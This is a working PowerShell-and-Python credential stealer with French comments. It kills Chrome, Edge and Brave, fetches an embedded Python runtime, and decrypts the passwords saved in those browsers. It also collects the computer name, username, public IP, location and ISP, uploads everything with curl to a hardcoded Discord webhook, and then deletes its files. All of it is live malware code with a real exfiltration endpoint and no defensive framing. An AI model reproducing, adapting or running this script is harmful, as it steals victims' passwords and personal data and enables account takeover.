$wh="https://discord.com/api/webhooks/1467597894507827302/I_ahkdTDu4dvbLntm3CtZq0nyoHAVCVPFeGbnSylTmhj4BJumMeXhSRNxD4JiaWsFAxr"
taskkill /F /IM msedge.exe,brave.exe,chrome.exe 2>$null
Start-Sleep 2
try{
# Vérifier si Python est déjà installé
$pyPath="$env:TEMP\py"
$needInstall=$false

if(!(Test-Path "$pyPath\python.exe")){
 $needInstall=$true
}else{
 # Vérifier si les bibliothèques sont installées
 cd $pyPath
 $testLibs=.\python.exe -c "import pycryptodome,win32crypt,requests;print('OK')" 2>$null
 if($testLibs -ne "OK"){$needInstall=$true}
}

if($needInstall){
 # Installation complète
 Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
 Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
 (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
 Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
 cd $pyPath
 .\python.exe gp.py --no-warn-script-location 2>$null
 .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
 Remove-Item "$env:TEMP\py.zip" -Force -EA 0
}

cd $pyPath

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime
from Crypto.Cipher import AES
try:
 import requests
 ip=requests.get("https://api.ipify.org",timeout=3).text
 geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
 location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
 isp=geo.get('isp','N/A')
except:
 ip="N/A"
 location="N/A"
 isp="N/A"
import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
def d(db,st,n):
 try:
  k=win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(st))["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
  shutil.copy2(db,"t.db");c=sqlite3.connect("t.db");r=[]
  for row in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
   try:r.append(f"[{n}] {row[0]}\nUsername: {row[1]}\nPassword: {AES.new(k,AES.MODE_GCM,nonce=row[2][3:15]).decrypt_and_verify(row[2][15:-16],row[2][-16:]).decode()}\n")
   except:pass
  c.close();os.remove("t.db");return r
 except:return []
res=[]
e=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
if os.path.exists(e+r"\Default\Login Data"):res+=d(e+r"\Default\Login Data",e+r"\Local State","EDGE")
b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
if os.path.exists(b+r"\Default\Login Data"):res+=d(b+r"\Default\Login Data",b+r"\Local State","BRAVE")
g=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
if os.path.exists(g+r"\Default\Login Data"):res+=d(g+r"\Default\Login Data",g+r"\Local State","CHROME")
info=f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {socket.gethostname()}
Language: {language}
Public IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}

TOTAL PASSWORDS: {len(res)}
{'='*60}

"""
if res:
 with open("p.txt","w",encoding="utf-8")as f:f.write(info+"".join(res))
 print("OK")
else:
 with open("p.txt","w",encoding="utf-8")as f:f.write(info+"No passwords found.\n")
 print("OK")
'@|Out-File "e.py" -Encoding UTF8
$r=.\python.exe e.py 2>$null
if($r -eq "OK"){curl.exe -F "file=@p.txt" $wh 2>$null;Remove-Item p.txt,e.py -Force -EA 0}
cd $env:TEMP
# Ne pas supprimer Python pour réutilisation future
}catch{curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME`"}" $wh}


